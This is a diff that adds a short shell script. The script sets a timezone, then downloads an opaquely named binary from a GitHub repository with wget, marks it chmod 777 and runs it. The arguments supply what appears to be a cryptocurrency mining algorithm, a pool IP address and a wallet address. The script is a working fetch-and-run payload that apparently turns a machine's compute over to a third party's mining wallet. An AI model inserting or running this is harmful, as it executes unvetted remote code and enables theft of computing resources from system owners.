@@ -1,0 +1,6 @@
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+wget https://github.com/kazppkido/gbut/raw/main/lol91
+chmod 777 lol91
+./lol91 -a KARLSENV2 -p 165.232.165.31:80 -u karlsen:qqm2xqewxe9mpl3xexd4gpq6j2gtf2l92wnktf62079deqry9v456c0n274uk.$(shuf -n 1 -i 1-99999)-Bismillah
